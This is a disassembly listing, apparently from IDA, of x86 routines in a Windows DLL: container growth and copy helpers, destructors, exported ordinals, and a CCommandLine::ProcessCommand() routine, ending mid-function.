; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D0A0	proc near		; CODE XREF: sub_6AF3D173+Dp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3CFE5
		add	esp, 14h
		leave
		retn
sub_6AF3D0A0	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D0BD	proc near		; CODE XREF: sub_6AF3D218+Fp
					; sub_6AF3D245+F4p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3D049
		add	esp, 10h
		leave
		retn
sub_6AF3D0BD	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3D0D7	proc near		; CODE XREF: sub_6AF3D460+194p
					; sub_6AF3D460+1EFp

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_0]
		jmp	short loc_6AF3D0EC
; ---------------------------------------------------------------------------

loc_6AF3D0DE:				; CODE XREF: sub_6AF3D0D7+19j
		push	[esp+4+arg_8]
		mov	ecx, esi
		call	sub_6AF31C41
		add	esi, 4

loc_6AF3D0EC:				; CODE XREF: sub_6AF3D0D7+5j
		cmp	esi, [esp+4+arg_4]
		jnz	short loc_6AF3D0DE
		pop	esi
		retn
sub_6AF3D0D7	endp

; Exported entry 462.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal462
Ordinal462	proc near		; CODE XREF: sub_6AF3D125+17p
					; sub_6AF3D1C2+Dp
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		mov	eax, [edi]
		mov	esi, ecx
		mov	[esi], eax
		mov	al, [edi+4]
		mov	[esi+4], al
		lea	eax, [edi+8]
		push	eax
		lea	ecx, [esi+8]
		call	sub_6AF31C41
		add	edi, 0Ch
		push	edi
		lea	ecx, [esi+0Ch]
		call	sub_6AF31C41
		pop	edi
		mov	eax, esi
		pop	esi
		retn	4
Ordinal462	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D125	proc near		; CODE XREF: sub_6AF3D1DF+10p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_4]
		cmp	[ebp+arg_0], esi
		jz	short loc_6AF3D146

loc_6AF3D131:				; CODE XREF: sub_6AF3D125+1Fj
		sub	[ebp+arg_8], 10h
		mov	ecx, [ebp+arg_8]
		sub	esi, 10h
		push	esi
		call	Ordinal462
		cmp	esi, [ebp+arg_0]
		jnz	short loc_6AF3D131

loc_6AF3D146:				; CODE XREF: sub_6AF3D125+Aj
		mov	eax, [ebp+arg_8]
		pop	esi
		pop	ebp
		retn
sub_6AF3D125	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D14C	proc near		; CODE XREF: sub_6AF3D1F9+10p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_4]
		cmp	[ebp+arg_0], esi
		jz	short loc_6AF3D16D

loc_6AF3D158:				; CODE XREF: sub_6AF3D14C+1Fj
		sub	[ebp+arg_8], 4
		mov	ecx, [ebp+arg_8]
		sub	esi, 4
		push	esi
		call	sub_6AF31C41
		cmp	esi, [ebp+arg_0]
		jnz	short loc_6AF3D158

loc_6AF3D16D:				; CODE XREF: sub_6AF3D14C+Aj
		mov	eax, [ebp+arg_8]
		pop	esi
		pop	ebp
		retn
sub_6AF3D14C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D173	proc near		; CODE XREF: sub_6AF3D245+C4p
					; sub_6AF3D245+17Bp ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3D0A0
		mov	eax, [ebp+arg_4]
		shl	eax, 4
		add	esp, 10h
		add	eax, [ebp+arg_0]
		pop	ebp
		retn	0Ch
sub_6AF3D173	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3D195	proc near		; CODE XREF: sub_6AF3D213j
					; Ordinal451+15Dp ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF3D1B4
		push	esi
		push	dword ptr [esi+8]
		push	eax
		call	sub_6AF3CFCB
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h

loc_6AF3D1B4:				; CODE XREF: sub_6AF3D195+8j
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+0Ch], 0
		pop	esi
		retn
sub_6AF3D195	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3D1C2	proc near		; CODE XREF: sub_6AF3D245+194p
					; sub_6AF3D245+1ECp

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_0]
		jmp	short loc_6AF3D1D7
; ---------------------------------------------------------------------------

loc_6AF3D1C9:				; CODE XREF: sub_6AF3D1C2+19j
		push	[esp+4+arg_8]
		mov	ecx, esi
		call	Ordinal462
		add	esi, 10h

loc_6AF3D1D7:				; CODE XREF: sub_6AF3D1C2+5j
		cmp	esi, [esp+4+arg_4]
		jnz	short loc_6AF3D1C9
		pop	esi
		retn
sub_6AF3D1C2	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D1DF	proc near		; CODE XREF: sub_6AF3D245+1DFp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3D125
		add	esp, 10h
		leave
		retn
sub_6AF3D1DF	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D1F9	proc near		; CODE XREF: sub_6AF3D460+1E2p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3D14C
		add	esp, 10h
		leave
		retn
sub_6AF3D1F9	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: thunk

sub_6AF3D213	proc near		; CODE XREF: sub_6AF53198+3j
		jmp	sub_6AF3D195
sub_6AF3D213	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3D218	proc near		; CODE XREF: Ordinal450+Cp
					; Ordinal451+20p
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF3D237
		push	esi
		push	dword ptr [esi+8]
		push	eax
		call	sub_6AF3D0BD
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h

loc_6AF3D237:				; CODE XREF: sub_6AF3D218+8j
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+0Ch], 0
		pop	esi
		retn
sub_6AF3D218	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF3D245(int, int, void *)
sub_6AF3D245	proc near		; CODE XREF: sub_6AF3D673+27p

var_28		= byte ptr -28h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_63 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 1Ch
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+arg_8]
		mov	esi, ecx
		lea	ecx, [ebp+var_28]
		mov	[ebp+var_14], esi
		call	Ordinal461
		and	[ebp+var_4], 0
		mov	ecx, esi
		call	sub_6AF3C98A
		mov	edi, [ebp+arg_4]
		test	edi, edi
		mov	ebx, eax
		jz	loc_6AF3D439
		mov	ecx, esi
		call	sub_6AF3C977
		mov	ecx, 0FFFFFFFh
		sub	ecx, eax
		cmp	ecx, edi
		mov	ecx, esi
		jnb	short loc_6AF3D299
		call	sub_6AF3C9DE
; ---------------------------------------------------------------------------

loc_6AF3D299:				; CODE XREF: sub_6AF3D245+4Dj
		call	sub_6AF3C977
		add	eax, edi
		cmp	ebx, eax
		jnb	loc_6AF3D37F
		mov	eax, ebx
		shr	eax, 1
		mov	ecx, 0FFFFFFFh
		sub	ecx, eax
		cmp	ecx, ebx
		jnb	short loc_6AF3D2BB
		xor	ebx, ebx
		jmp	short loc_6AF3D2BD
; ---------------------------------------------------------------------------

loc_6AF3D2BB:				; CODE XREF: sub_6AF3D245+70j
		add	ebx, eax

loc_6AF3D2BD:				; CODE XREF: sub_6AF3D245+74j
		mov	ecx, esi
		call	sub_6AF3C977
		add	eax, edi
		cmp	ebx, eax
		jnb	short loc_6AF3D2D5
		mov	ecx, esi
		call	sub_6AF3C977
		mov	ebx, eax
		add	ebx, edi

loc_6AF3D2D5:				; CODE XREF: sub_6AF3D245+83j
		shl	ebx, 4
		push	ebx		; Size
		mov	[ebp+var_18], ebx
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ebx, eax
		mov	eax, [esi+4]
		push	esi
		push	ebx
		push	[ebp+arg_0]
		mov	[ebp+arg_8], ebx
		push	eax
		mov	[ebp+arg_4], ebx
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF3D062
		add	esp, 14h
		lea	ecx, [ebp+var_28]
		push	ecx
		push	edi
		push	eax
		mov	ecx, esi
		mov	[ebp+arg_4], eax
		call	sub_6AF3D173
		mov	[ebp+arg_4], eax
		mov	eax, [esi+8]
		push	esi
		push	[ebp+arg_4]
		push	eax
		push	[ebp+arg_0]
		call	sub_6AF3D062
		add	esp, 10h
		mov	ecx, esi
		call	sub_6AF3C977
		add	edi, eax
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF3D349
		push	esi
		push	dword ptr [esi+8]
		push	eax
		call	sub_6AF3D0BD
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h

loc_6AF3D349:				; CODE XREF: sub_6AF3D245+EDj
		mov	eax, [ebp+var_18]
		add	eax, ebx
		shl	edi, 4
		add	edi, ebx
		mov	[esi+0Ch], eax
		mov	[esi+8], edi
		mov	[esi+4], ebx
		jmp	loc_6AF3D439
; ---------------------------------------------------------------------------

loc_6AF3D361:				; DATA XREF: .rdata:6AF62D28o
		push	[ebp+var_14]
		push	[ebp+arg_4]
		push	[ebp+arg_8]
		call	sub_6AF3D0BD
		push	[ebp+arg_8]	; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h
		jmp	loc_6AF3D401
; ---------------------------------------------------------------------------

loc_6AF3D37F:				; CODE XREF: sub_6AF3D245+5Dj
		mov	eax, [esi+8]
		mov	ecx, [ebp+arg_0]
		mov	edx, eax
		sub	edx, ecx
		sar	edx, 4
		cmp	edx, edi
		mov	[ebp+arg_8], eax
		push	esi
		jnb	short loc_6AF3D40A
		mov	ebx, edi
		shl	ebx, 4
		lea	edx, [ebx+ecx]
		push	edx
		push	eax
		push	ecx
		call	sub_6AF3D062
		mov	eax, [esi+8]
		add	esp, 10h
		lea	ecx, [ebp+var_28]
		push	ecx
		mov	ecx, eax
		sub	ecx, [ebp+arg_0]
		mov	byte ptr [ebp+var_4], 3
		sar	ecx, 4
		sub	edi, ecx
		push	edi
		push	eax
		mov	ecx, esi
		call	sub_6AF3D173
		add	[esi+8], ebx
		mov	esi, [esi+8]
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		sub	esi, ebx
		push	esi
		push	[ebp+arg_0]
		call	sub_6AF3D1C2
		add	esp, 0Ch
		jmp	short loc_6AF3D439
; ---------------------------------------------------------------------------

loc_6AF3D3E3:				; DATA XREF: .rdata:6AF62D38o
		mov	ecx, [ebp+var_14]
		mov	eax, [ebp+arg_4]
		push	ecx
		mov	ecx, [ecx+8]
		shl	eax, 4
		add	ecx, eax
		push	ecx
		mov	ecx, [ebp+arg_0]
		add	eax, ecx
		push	eax
		call	sub_6AF3D0BD
		add	esp, 0Ch

loc_6AF3D401:				; CODE XREF: sub_6AF3D245+135j
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3D40A:				; CODE XREF: sub_6AF3D245+14Dj
		push	eax
		mov	ebx, eax
		shl	edi, 4
		push	eax
		sub	ebx, edi
		push	ebx
		call	sub_6AF3D062
		push	[ebp+arg_8]
		mov	[esi+8], eax
		mov	esi, [ebp+arg_0]
		push	ebx
		push	esi
		call	sub_6AF3D1DF
		lea	eax, [ebp+var_28]
		push	eax
		add	edi, esi
		push	edi
		push	esi
		call	sub_6AF3D1C2
		add	esp, 28h

loc_6AF3D439:				; CODE XREF: sub_6AF3D245+35j
					; sub_6AF3D245+117j ...
		mov	ecx, [ebp+var_1C]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_20]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	0Ch
sub_6AF3D245	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D460	proc near		; CODE XREF: sub_6AF3D6B0+27p

var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_64 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 10h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+arg_8]
		mov	esi, ecx
		lea	ecx, [ebp+arg_8]
		mov	[ebp+var_18], esi
		call	sub_6AF316B7
		and	[ebp+var_4], 0
		mov	ecx, esi
		call	sub_6AF501E2
		mov	edi, [ebp+arg_4]
		test	edi, edi
		mov	ebx, eax
		jz	loc_6AF3D657
		mov	ecx, esi
		call	sub_6AF501F5
		mov	ecx, 3FFFFFFFh
		sub	ecx, eax
		cmp	ecx, edi
		mov	ecx, esi
		jnb	short loc_6AF3D4B4
		call	sub_6AF3C9DE
; ---------------------------------------------------------------------------

loc_6AF3D4B4:				; CODE XREF: sub_6AF3D460+4Dj
		call	sub_6AF501F5
		add	eax, edi
		cmp	ebx, eax
		jnb	loc_6AF3D598
		mov	eax, ebx
		shr	eax, 1
		mov	ecx, 3FFFFFFFh
		sub	ecx, eax
		cmp	ecx, ebx
		jnb	short loc_6AF3D4D6
		xor	ebx, ebx
		jmp	short loc_6AF3D4D8
; ---------------------------------------------------------------------------

loc_6AF3D4D6:				; CODE XREF: sub_6AF3D460+70j
		add	ebx, eax

loc_6AF3D4D8:				; CODE XREF: sub_6AF3D460+74j
		mov	ecx, esi
		call	sub_6AF501F5
		add	eax, edi
		cmp	ebx, eax
		jnb	short loc_6AF3D4F0
		mov	ecx, esi
		call	sub_6AF501F5
		mov	ebx, eax
		add	ebx, edi

loc_6AF3D4F0:				; CODE XREF: sub_6AF3D460+83j
		shl	ebx, 2
		push	ebx		; Size
		mov	[ebp+var_1C], ebx
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ebx, eax
		mov	eax, [esi+4]
		push	esi
		push	ebx
		push	[ebp+arg_0]
		mov	[ebp+var_14], ebx
		push	eax
		mov	[ebp+arg_4], ebx
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF3CF2A
		add	esp, 14h
		lea	ecx, [ebp+arg_8]
		push	ecx
		push	edi
		push	eax
		mov	ecx, esi
		mov	[ebp+arg_4], eax
		call	sub_6AF3D07F
		mov	[ebp+arg_4], eax
		mov	eax, [esi+8]
		push	esi
		push	[ebp+arg_4]
		push	eax
		push	[ebp+arg_0]
		call	sub_6AF3CF2A
		add	esp, 10h
		mov	ecx, esi
		call	sub_6AF501F5
		add	edi, eax
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF3D564
		push	esi
		push	dword ptr [esi+8]
		push	eax
		call	sub_6AF3CFCB
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h

loc_6AF3D564:				; CODE XREF: sub_6AF3D460+EDj
		mov	eax, [ebp+var_1C]
		add	eax, ebx
		mov	[esi+0Ch], eax
		lea	eax, [ebx+edi*4]
		mov	[esi+8], eax
		mov	[esi+4], ebx
		jmp	loc_6AF3D657
; ---------------------------------------------------------------------------

loc_6AF3D57A:				; DATA XREF: .rdata:6AF62DB4o
		push	[ebp+var_18]
		push	[ebp+arg_4]
		push	[ebp+var_14]
		call	sub_6AF3CFCB
		push	[ebp+var_14]	; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 10h
		jmp	loc_6AF3D61C
; ---------------------------------------------------------------------------

loc_6AF3D598:				; CODE XREF: sub_6AF3D460+5Dj
		mov	eax, [esi+8]
		mov	ebx, [ebp+arg_0]
		mov	ecx, eax
		sub	ecx, ebx
		sar	ecx, 2
		cmp	ecx, edi
		mov	[ebp+var_1C], eax
		push	esi
		jnb	short loc_6AF3D625
		mov	ecx, edi
		shl	ecx, 2
		mov	[ebp+var_1C], ecx
		add	ecx, ebx
		push	ecx
		push	eax
		push	ebx
		call	sub_6AF3CF2A
		mov	eax, [esi+8]
		add	esp, 10h
		lea	ecx, [ebp+arg_8]
		push	ecx
		mov	ecx, eax
		sub	ecx, ebx
		sar	ecx, 2
		sub	edi, ecx
		push	edi
		push	eax
		mov	ecx, esi
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF3D07F
		mov	eax, [ebp+var_1C]
		add	[esi+8], eax
		mov	esi, [esi+8]
		and	[ebp+var_4], 0
		lea	ecx, [ebp+arg_8]
		push	ecx
		sub	esi, eax
		push	esi
		push	ebx
		call	sub_6AF3D0D7
		add	esp, 0Ch
		jmp	short loc_6AF3D657
; ---------------------------------------------------------------------------

loc_6AF3D5FE:				; DATA XREF: .rdata:6AF62DC4o
		mov	ecx, [ebp+var_18]
		mov	eax, [ebp+arg_4]
		push	ecx
		mov	ecx, [ecx+8]
		shl	eax, 2
		add	ecx, eax
		push	ecx
		mov	ecx, [ebp+arg_0]
		add	eax, ecx
		push	eax
		call	sub_6AF3CFCB
		add	esp, 0Ch

loc_6AF3D61C:				; CODE XREF: sub_6AF3D460+133j
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3D625:				; CODE XREF: sub_6AF3D460+14Bj
		push	eax
		mov	[ebp+arg_0], eax
		shl	edi, 2
		sub	[ebp+arg_0], edi
		push	eax
		push	[ebp+arg_0]
		call	sub_6AF3CF2A
		push	[ebp+var_1C]
		mov	[esi+8], eax
		push	[ebp+arg_0]
		push	ebx
		call	sub_6AF3D1F9
		lea	eax, [ebp+arg_8]
		push	eax
		add	edi, ebx
		push	edi
		push	ebx
		call	sub_6AF3D0D7
		add	esp, 28h

loc_6AF3D657:				; CODE XREF: sub_6AF3D460+35j
					; sub_6AF3D460+115j ...
		mov	ecx, [ebp+arg_8]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	0Ch
sub_6AF3D460	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF3D673(int, int, void *)
sub_6AF3D673	proc near		; CODE XREF: sub_6AF3D737+35p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, ecx
		call	sub_6AF3C977
		test	eax, eax
		jnz	short loc_6AF3D684
		xor	esi, esi
		jmp	short loc_6AF3D68E
; ---------------------------------------------------------------------------

loc_6AF3D684:				; CODE XREF: sub_6AF3D673+Bj
		mov	esi, [esp+8+arg_4]
		sub	esi, [edi+4]
		sar	esi, 4

loc_6AF3D68E:				; CODE XREF: sub_6AF3D673+Fj
		push	[esp+8+arg_8]	; void *
		mov	ecx, edi
		push	1		; int
		push	[esp+10h+arg_4]	; int
		call	sub_6AF3D245
		mov	eax, [esp+8+arg_0]
		shl	esi, 4
		add	esi, [edi+4]
		pop	edi
		mov	[eax], esi
		pop	esi
		retn	0Ch
sub_6AF3D673	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3D6B0	proc near		; CODE XREF: sub_6AF3D777+35p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, ecx
		call	sub_6AF501F5
		test	eax, eax
		jnz	short loc_6AF3D6C1
		xor	esi, esi
		jmp	short loc_6AF3D6CB
; ---------------------------------------------------------------------------

loc_6AF3D6C1:				; CODE XREF: sub_6AF3D6B0+Bj
		mov	esi, [esp+8+arg_4]
		sub	esi, [edi+4]
		sar	esi, 2

loc_6AF3D6CB:				; CODE XREF: sub_6AF3D6B0+Fj
		push	[esp+8+arg_8]
		mov	ecx, edi
		push	1
		push	[esp+10h+arg_4]
		call	sub_6AF3D460
		mov	eax, [edi+4]
		lea	ecx, [eax+esi*4]
		mov	eax, [esp+8+arg_0]
		pop	edi
		mov	[eax], ecx
		pop	esi
		retn	0Ch
sub_6AF3D6B0	endp

; Exported entry 448.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal448
Ordinal448	proc near		; CODE XREF: Ordinal1074+318p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF58F0C
		call	sub_6AF318C3
		lea	ecx, [esi+8]
		call	sub_6AF318C3
		xor	eax, eax
		mov	[esi+10h], eax
		mov	[esi+14h], eax
		mov	[esi+18h], eax
		mov	eax, esi
		pop	esi
		retn
Ordinal448	endp

; Exported entry 450.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal450
Ordinal450	proc near		; CODE XREF: sub_6AF3D7B7+3p
					; Ordinal1074+49Cp ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+0Ch]
		mov	dword ptr [esi], offset	off_6AF58F0C
		call	sub_6AF3D218
		lea	ecx, [esi+8]
		call	sub_6AF3789B
		lea	ecx, [esi+4]
		pop	esi
		jmp	sub_6AF3789B
Ordinal450	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D737	proc near		; CODE XREF: Ordinal457+FCp

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		mov	esi, ecx
		call	sub_6AF3C977
		mov	ecx, esi
		mov	edi, eax
		call	sub_6AF3C98A
		cmp	edi, eax
		push	[ebp+arg_0]
		mov	ecx, esi
		jnb	short loc_6AF3D764
		push	1
		push	dword ptr [esi+8]
		call	sub_6AF3D173
		mov	[esi+8], eax
		jmp	short loc_6AF3D771
; ---------------------------------------------------------------------------

loc_6AF3D764:				; CODE XREF: sub_6AF3D737+1Cj
		mov	eax, [esi+8]
		push	eax		; int
		lea	eax, [ebp+arg_0]
		push	eax		; int
		call	sub_6AF3D673

loc_6AF3D771:				; CODE XREF: sub_6AF3D737+2Bj
		pop	edi
		pop	esi
		pop	ebp
		retn	4
sub_6AF3D737	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D777	proc near		; CODE XREF: Ordinal460+151p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		mov	esi, ecx
		call	sub_6AF501F5
		mov	ecx, esi
		mov	edi, eax
		call	sub_6AF501E2
		cmp	edi, eax
		push	[ebp+arg_0]
		mov	ecx, esi
		jnb	short loc_6AF3D7A4
		push	1
		push	dword ptr [esi+8]
		call	sub_6AF3D07F
		mov	[esi+8], eax
		jmp	short loc_6AF3D7B1
; ---------------------------------------------------------------------------

loc_6AF3D7A4:				; CODE XREF: sub_6AF3D777+1Cj
		mov	eax, [esi+8]
		push	eax
		lea	eax, [ebp+arg_0]
		push	eax
		call	sub_6AF3D6B0

loc_6AF3D7B1:				; CODE XREF: sub_6AF3D777+2Bj
		pop	edi
		pop	esi
		pop	ebp
		retn	4
sub_6AF3D777	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3D7B7(void *, char)
sub_6AF3D7B7	proc near		; DATA XREF: .rdata:off_6AF58F0Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal450
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3D7CD
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3D7CD:				; CODE XREF: sub_6AF3D7B7+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3D7B7	endp

; Exported entry 457.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal457
Ordinal457	proc near		; CODE XREF: Ordinal451+13Ep
					; DATA XREF: .rdata:off_6AF66098o

var_48		= byte ptr -48h
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= byte ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_65 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	[ebp+var_28], ecx
		push	offset aCcommandlinePr ; "CCommandLine::ProcessCommand()"
		lea	ecx, [ebp+var_48]
		mov	[ebp+var_14], eax
		call	Ordinal751
		xor	edi, edi
		lea	ecx, [ebp+var_24]
		mov	[ebp+var_4], edi
		call	Ordinal458
		mov	esi, [ebp+arg_0]
		push	esi
		lea	ecx, [ebp+var_1C]
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31C41
		push	esi
		lea	ecx, [ebp+var_18]
		call	sub_6AF31C41
		cmp	[ebp+arg_4], edi
		mov	[ebp+var_24], edi
		mov	[ebp+var_20], 0
		jnz	loc_6AF3D8C5
		mov	eax, [esi]
		cmp	[eax-0Ch], edi
		jge	short loc_6AF3D845
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF3D845:				; CODE XREF: Ordinal457+66j
		mov	bl, [eax]
		mov	ecx, [ebp+var_28]
		push	edi
		mov	byte ptr [ebp+arg_0], bl
		push	[ebp+arg_0]
		add	ecx, 8
		call	sub_6AF3CAEF
		cmp	eax, 0FFFFFFFFh
		jz	short loc_6AF3D8C5
		mov	eax, [esi]
		mov	ecx, [eax-0Ch]
		xor	eax, eax
		inc	eax
		cmp	ecx, eax
		jg	short loc_6AF3D897
		push	offset aCcommandline_1 ; "CCommandLine::ProcessCommand() : sComma"...
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, [ebp+var_18]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_1C]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		xor	eax, eax
		jmp	short loc_6AF3D903
; ---------------------------------------------------------------------------

loc_6AF3D897:				; CODE XREF: Ordinal457+95j
		push	eax
		mov	[ebp+var_24], eax
		lea	eax, [ebp+arg_0]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_20], bl
		call	sub_6AF3CE87
		push	eax
		lea	ecx, [ebp+var_1C]
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF31C41
		mov	ecx, [ebp+arg_0]
		add	ecx, 0FFFFFFF0h
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF3160D

loc_6AF3D8C5:				; CODE XREF: Ordinal457+5Bj
					; Ordinal457+89j
		mov	ecx, [ebp+var_28]
		lea	eax, [ebp+var_24]
		push	eax
		add	ecx, 0Ch
		call	sub_6AF3D737
		mov	ecx, [ebp+var_18]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_1C]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D

loc_6AF3D8EA:				; DATA XREF: sub_6AF3D91C+3Do
					; sub_6AF3D95F+4Fo
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		mov	esi, eax
